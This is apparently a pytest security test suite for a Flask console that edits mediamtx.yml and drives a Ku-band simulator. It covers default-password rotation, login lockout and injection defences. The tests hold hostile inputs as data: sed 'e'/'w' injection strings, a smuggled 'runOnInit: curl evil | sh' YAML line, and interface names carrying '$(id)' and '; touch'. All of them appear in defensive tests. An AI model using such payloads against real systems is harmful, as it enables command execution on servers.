"""Security tests for the web console (ops #618).

The console is one big file that writes under /opt and /usr/local, so each test loads a
copy of it with those prefixes moved into a temp folder (the same trick as the
verify-console-ui skill). Nothing here touches the real system.

Run:  python3 -m pytest tests -q      (needs flask, ruamel.yaml, requests, psutil, pytest)
"""
import importlib.util
import json
import os
import stat
import subprocess
import sys

import pytest

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EDITOR = os.path.join(REPO, 'config-editor', 'mediamtx_config_editor.py')
SIM_DIR = os.path.join(REPO, 'scripts', 'ku-band-simulator')

SAMPLE_CONFIG = """logLevel: info
readTimeout: 10s
writeTimeout: 10s
rtspAddress: :8554
hls: yes
hlsVariant: mpegts
pathDefaults:
  overridePublisher: yes
  maxReaders: 0
paths:
  all_others:
"""


@pytest.fixture
def ed(tmp_path):
    """The console module, with /opt and /usr/local moved into tmp_path."""
    sandbox = str(tmp_path / 'root')
    src = open(EDITOR, encoding='utf-8').read()
    src = src.replace('/usr/local/', sandbox + '/usr/local/').replace('/opt/', sandbox + '/opt/')
    os.makedirs(sandbox + '/usr/local/etc', exist_ok=True)
    os.makedirs(sandbox + '/opt/mediamtx-webeditor', exist_ok=True)
    with open(sandbox + '/usr/local/etc/mediamtx.yml', 'w') as f:
        f.write(SAMPLE_CONFIG)
    path = str(tmp_path / 'editor_under_test.py')
    with open(path, 'w', encoding='utf-8') as f:
        f.write(src)
    name = 'editor_under_test_%d' % id(tmp_path)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    mod.app.config['TESTING'] = True
    mod.mtx_restart_checked = lambda *a, **k: None
    mod.time.sleep = lambda *a, **k: None
    mod._sandbox = sandbox
    yield mod
    sys.modules.pop(name, None)


def admin_client(ed):
    client = ed.app.test_client()
    with client.session_transaction() as s:
        s['logged_in'] = True
        s['role'] = 'admin'
        s['username'] = 'admin'
    return client


def config_text(ed):
    return open(ed.CONFIG_FILE).read()


# --- the default admin / admin login ------------------------------------------------------

def test_new_box_gets_random_admin_password_not_admin(ed):
    users = ed.load_users()
    assert users[0]['username'] == 'admin'
    assert users[0]['password'] != 'admin'
    assert len(users[0]['password']) >= 12
    # the password is on disk for the server admin, root-only
    saved = open(ed.INITIAL_PASSWORD_FILE).read()
    assert users[0]['password'] in saved
    assert stat.S_IMODE(os.stat(ed.INITIAL_PASSWORD_FILE).st_mode) == 0o600
    assert stat.S_IMODE(os.stat(ed.USERS_FILE).st_mode) == 0o600


def test_two_new_boxes_do_not_share_a_password(ed):
    first = ed.load_users()[0]['password']
    os.remove(ed.USERS_FILE)
    second = ed.load_users()[0]['password']
    assert first != second


def test_existing_admin_admin_is_rotated_on_load(ed):
    with open(ed.USERS_FILE, 'w') as f:
        json.dump([{'username': 'admin', 'password': 'admin', 'role': 'admin'},
                   {'username': 'bob', 'password': 'a-good-one-123', 'role': 'viewer'}], f)
    users = ed.load_users()
    by_name = {u['username']: u for u in users}
    assert by_name['admin']['password'] != 'admin'
    assert by_name['bob']['password'] == 'a-good-one-123'  # other logins are left alone
    assert ed.authenticate_user('admin', 'admin') is None
    assert ed.authenticate_user('admin', by_name['admin']['password']) == 'admin'
    # the rotation was saved, not just returned
    assert json.load(open(ed.USERS_FILE))[0]['password'] == by_name['admin']['password']


def test_admin_admin_never_logs_in(ed):
    client = ed.app.test_client()
    r = client.post('/login', data={'username': 'admin', 'password': 'admin'})
    assert r.status_code == 200
    assert b'Invalid username or password' in r.data
    with client.session_transaction() as s:
        assert not s.get('logged_in')


def test_login_page_does_not_print_the_default_password(ed):
    page = ed.app.test_client().get('/login').get_data(as_text=True)
    assert 'admin / admin' not in page
    assert ed.INITIAL_PASSWORD_FILE in page  # it says where the real one is


def test_correct_password_logs_in(ed):
    pw = ed.load_users()[0]['password']
    client = ed.app.test_client()
    r = client.post('/login', data={'username': 'admin', 'password': pw})
    assert r.status_code == 302
    with client.session_transaction() as s:
        assert s.get('logged_in') and s.get('role') == 'admin'


def test_nobody_can_set_the_password_admin(ed):
    assert ed.password_problem('admin')
    assert ed.password_problem(' Admin ')
    assert not ed.password_problem('a-real-password')
    pw = ed.load_users()[0]['password']
    client = admin_client(ed)
    r = client.post('/change_password', data={'current_password': pw, 'new_password': 'admin',
                                                'confirm_password': 'admin'})
    assert r.status_code == 302 and 'not allowed' in r.headers['Location'].replace('%20', ' ')
    assert json.load(open(ed.USERS_FILE))[0]['password'] == pw
    r = client.post('/api/webeditor/users/add', json={'username': 'eve', 'email': 'e@example.com',
                                                        'password': 'admin', 'role': 'admin'})
    assert r.status_code == 400
    assert all(u['username'] != 'eve' for u in json.load(open(ed.USERS_FILE)))


def test_changing_the_admin_password_removes_the_first_password_file(ed):
    pw = ed.load_users()[0]['password']
    assert os.path.exists(ed.INITIAL_PASSWORD_FILE)
    client = admin_client(ed)
    client.post('/change_password', data={'current_password': pw, 'new_password': 'my-new-pass-1',
                                            'confirm_password': 'my-new-pass-1'})
    assert not os.path.exists(ed.INITIAL_PASSWORD_FILE)
    assert ed.authenticate_user('admin', 'my-new-pass-1') == 'admin'


# --- login throttle -----------------------------------------------------------------------

def test_login_is_locked_after_repeated_failures(ed):
    pw = ed.load_users()[0]['password']
    client = ed.app.test_client()
    for _ in range(ed.LOGIN_MAX_FAILURES):
        r = client.post('/login', data={'username': 'admin', 'password': 'wrong'})
        assert r.status_code == 200
    # now even the right password is refused for a while
    r = client.post('/login', data={'username': 'admin', 'password': pw})
    assert r.status_code == 429
    assert b'Too many failed logins' in r.data
    with client.session_transaction() as s:
        assert not s.get('logged_in')


def test_lock_also_follows_the_username_across_addresses(ed):
    pw = ed.load_users()[0]['password']
    for i in range(ed.LOGIN_MAX_FAILURES):
        c = ed.app.test_client()
        c.post('/login', data={'username': 'admin', 'password': 'wrong'},
               environ_overrides={'REMOTE_ADDR': '10.0.0.%d' % (i + 1)})
    c = ed.app.test_client()
    r = c.post('/login', data={'username': 'admin', 'password': pw},
               environ_overrides={'REMOTE_ADDR': '10.9.9.9'})
    assert r.status_code == 429


def test_lock_expires(ed):
    with ed.app.test_request_context('/login', environ_base={'REMOTE_ADDR': '10.1.1.1'}):
        for _ in range(ed.LOGIN_MAX_FAILURES):
            ed.record_login_failure('admin', now=1000.0)
        assert ed.login_wait_seconds('admin', now=1001.0) > 0
        assert ed.login_wait_seconds('admin', now=1000.0 + ed.LOGIN_WINDOW_SECONDS + 1) == 0


def test_a_good_login_clears_the_username_count(ed):
    pw = ed.load_users()[0]['password']
    client = ed.app.test_client()
    for _ in range(ed.LOGIN_MAX_FAILURES - 1):
        client.post('/login', data={'username': 'admin', 'password': 'wrong'})
    assert client.post('/login', data={'username': 'admin', 'password': pw}).status_code == 302
    with ed.app.test_request_context('/login'):
        assert ed._login_failures.get('user:admin') is None


# --- form values reaching mediamtx.yml ----------------------------------------------------

def test_set_config_line_replaces_and_inserts_without_a_shell(ed):
    assert ed.set_config_line('logLevel:', 'logLevel: debug')
    assert 'logLevel: debug\n' in config_text(ed)
    assert ed.set_config_line('rtspTransports:', 'rtspTransports: [tcp]', insert_after='rtspAddress:')
    assert 'rtspAddress: :8554\nrtspTransports: [tcp]\n' in config_text(ed)
    assert ed.set_config_line('  rtspDemuxMpegts:', '  rtspDemuxMpegts: true', insert_after='pathDefaults:')
    assert 'pathDefaults:\n  rtspDemuxMpegts: true\n' in config_text(ed)
    # a value with sed's special characters stays plain data
    ed.set_config_line('writeTimeout:', 'writeTimeout: a/b&c\\d;w x')
    assert 'writeTimeout: a/b&c\\d;w x\n' in config_text(ed)


def test_set_config_line_refuses_line_breaks(ed):
    before = config_text(ed)
    with pytest.raises(ValueError):
        ed.set_config_line('logLevel:', 'logLevel: info\nrunOnInit: curl evil | sh')
    assert config_text(ed) == before


SED_PAYLOADS = [
    'info/;e touch {canary};s/x/y',           # GNU sed `e` command: runs a command (as root in the console)
    'info/;w {canary}',                       # sed `w`: write a file
    'info/;1e touch {canary}',
    's/x/y/e',
    'info\nrunOnConnect: touch {canary}',    # a new YAML line
]


@pytest.mark.parametrize('payload', SED_PAYLOADS)
def test_save_basic_refuses_sed_injection(ed, tmp_path, payload):
    canary = str(tmp_path / 'canary')
    before = config_text(ed)
    client = admin_client(ed)
    r = client.post('/save_basic', data={'logLevel': payload.format(canary=canary),
                                         'readTimeout': '10s', 'writeTimeout': '10s'})
    assert r.status_code == 302
    assert not os.path.exists(canary)
    assert config_text(ed) == before


@pytest.mark.parametrize('field', ['readTimeout', 'writeTimeout'])
def test_save_basic_refuses_bad_timeouts(ed, tmp_path, field):
    canary = str(tmp_path / 'canary')
    before = config_text(ed)
    data = {'logLevel': 'info', 'readTimeout': '10s', 'writeTimeout': '10s'}
    data[field] = '10s/;w ' + canary
    admin_client(ed).post('/save_basic', data=data)
    assert not os.path.exists(canary)
    assert config_text(ed) == before


def test_save_basic_saves_good_values(ed):
    r = admin_client(ed).post('/save_basic', data={'logLevel': 'debug', 'readTimeout': '30s',
                                                   'writeTimeout': '1m'})
    assert r.status_code == 302 and 'success' in r.headers['Location']
    text = config_text(ed)
    assert 'logLevel: debug\n' in text and 'readTimeout: 30s\n' in text and 'writeTimeout: 1m\n' in text


def test_save_hls_refuses_sed_injection_and_saves_nothing(ed, tmp_path):
    canary = str(tmp_path / 'canary')
    before = config_text(ed)
    r = admin_client(ed).post('/save_hls', data={
        'hlsVariant': 'mpegts', 'hlsSegmentCount': '7', 'hlsSegmentDuration': '1s',
        'hlsPartDuration': '200ms', 'hlsSegmentMaxSize': '50M/;w ' + canary,
        'hlsAlwaysRemux': 'no', 'hlsMuxerCloseAfter': '60s', 'writeQueueSize': '512'})
    assert r.status_code == 302
    assert not os.path.exists(canary)
    assert config_text(ed) == before


def test_save_hls_saves_good_values(ed):
    r = admin_client(ed).post('/save_hls', data={
        'hlsVariant': 'fmp4', 'hlsSegmentCount': '5', 'hlsSegmentDuration': '2s',
        'hlsPartDuration': '200ms', 'hlsSegmentMaxSize': '50M', 'hlsAlwaysRemux': 'yes',
        'hlsMuxerCloseAfter': '60s', 'writeQueueSize': '512', 'rtspDemuxMpegts': 'true'})
    assert r.status_code == 302 and 'success' in r.headers['Location']
    text = config_text(ed)
    assert 'hlsVariant: fmp4\n' in text and 'hlsSegmentCount: 5\n' in text
    assert 'hlsAlwaysRemux: yes\n' in text and '  rtspDemuxMpegts: true\n' in text


def test_save_protocols_refuses_bad_values(ed, tmp_path):
    canary = str(tmp_path / 'canary')
    for field, bad in (('rtspAddress', '8554/;w ' + canary), ('rtspTransports', 'tcp,x/;w ' + canary),
                       ('srtPublishPassphrase', 'goodpassphrase\nrunOnInit: touch ' + canary)):
        before = config_text(ed)
        r = admin_client(ed).post('/save_protocols', data={field: bad})
        assert r.status_code == 302
        assert not os.path.exists(canary)
        assert config_text(ed) == before


def test_save_protocols_saves_good_values(ed):
    r = admin_client(ed).post('/save_protocols', data={'rtspAddress': '8555', 'rtspTransports': 'udp,tcp',
                                                      'srtPublishPassphrase': 'a/b&c passphrase 123'})
    assert r.status_code == 302
    text = config_text(ed)
    assert 'rtspAddress: :8555\n' in text
    assert 'rtspTransports: [udp, tcp]\n' in text
    assert 'srtPublishPassphrase: a/b&c passphrase 123\n' in text


def test_no_sed_left_in_the_console():
    assert "'sed'" not in open(EDITOR, encoding='utf-8').read()


# --- Ku-band simulator --------------------------------------------------------------------

@pytest.mark.parametrize('name', ['eth0', 'ens18', 'br-lan', 'wlan0.1', 'eth0:1'])
def test_simulator_accepts_real_interface_names(ed, name):
    assert ed.valid_simulator_interface(name)


@pytest.mark.parametrize('name', ['eth0; touch /tmp/x', 'eth0$(id)', 'eth0`id`', 'a b', "eth0'", 'eth0\nX=1',
                                  '', '-rf', 'a' * 16, '../x'])
def test_simulator_refuses_shell_in_interface(ed, name):
    assert not ed.valid_simulator_interface(name)
    with pytest.raises(ValueError):
        ed.update_simulator_conf_text('SOURCE_IP=1.1.1.1\nINTERFACE=eth0\n', '10.0.0.5', name)


def test_simulator_conf_text_only_gets_an_ip_and_a_name(ed):
    out = ed.update_simulator_conf_text('SOURCE_IP=1.1.1.1\nINTERFACE=eth0\n# keep\n', '10.0.0.5', 'ens3')
    assert out == 'SOURCE_IP=10.0.0.5\nINTERFACE=ens3\n# keep\n'
    with pytest.raises(ValueError):
        ed.update_simulator_conf_text('SOURCE_IP=1.1.1.1\n', '1.1.1.1; id', 'eth0')


def test_simulator_route_refuses_bad_interface(ed, tmp_path):
    ed.SIMULATOR_DIR = str(tmp_path / 'sim')
    os.makedirs(ed.SIMULATOR_DIR)
    r = admin_client(ed).post('/api/ku-band-simulator/on-for-source',
                              json={'sourceUrl': 'srt://203.0.113.9:8890', 'interface': 'eth0;touch x'})
    assert r.status_code == 400
    assert not os.path.exists(os.path.join(ed.SIMULATOR_DIR, 'ku_band_simulator.conf'))


def run_sim_script(tmp_path, script, conf_text):
    """Run a simulator script from a copy in tmp_path, as data in a conf file. Returns (code, output)."""
    d = tmp_path / 'sim'
    d.mkdir()
    for name in ('ku_band_simulator_on.sh', 'ku_band_simulator_off.sh'):
        (d / name).write_text(open(os.path.join(SIM_DIR, name)).read())
    (d / 'ku_band_simulator.conf').write_text(conf_text)
    p = subprocess.run(['bash', str(d / script)], capture_output=True, text=True, timeout=30)
    return p.returncode, p.stdout + p.stderr


@pytest.mark.parametrize('script', ['ku_band_simulator_on.sh', 'ku_band_simulator_off.sh'])
def test_simulator_scripts_do_not_run_the_conf_file(tmp_path, script):
    canary = tmp_path / 'canary'
    conf = 'SOURCE_IP=10.0.0.5\nINTERFACE=eth0\ntouch %s\nINTERFACE=$(touch %s)\n' % (canary, canary)
    code, out = run_sim_script(tmp_path, script, conf)
    assert not canary.exists(), out


@pytest.mark.parametrize('iface', ['eth0;touch CANARY', 'eth0$(touch CANARY)', 'eth0`touch CANARY`'])
def test_simulator_scripts_refuse_a_bad_interface(tmp_path, iface):
    canary = tmp_path / 'canary'
    conf = 'SOURCE_IP=10.0.0.5\nINTERFACE=%s\n' % iface.replace('CANARY', str(canary))
    for script in ('ku_band_simulator_on.sh', 'ku_band_simulator_off.sh'):
        sub = tmp_path / script
        sub.mkdir()
        code, out = run_sim_script(sub, script, conf)
        assert code != 0 and not canary.exists(), out
        assert 'not a valid interface name' in out


def test_simulator_on_script_refuses_bad_ip_and_numbers(tmp_path):
    for i, conf in enumerate(['SOURCE_IP=1.1.1.1;id\nINTERFACE=eth0\n',
                              'SOURCE_IP=1.1.1.1\nINTERFACE=eth0\nDELAY_MS=5;id\n']):
        sub = tmp_path / str(i)
        sub.mkdir()
        code, out = run_sim_script(sub, 'ku_band_simulator_on.sh', conf)
        assert code != 0, out
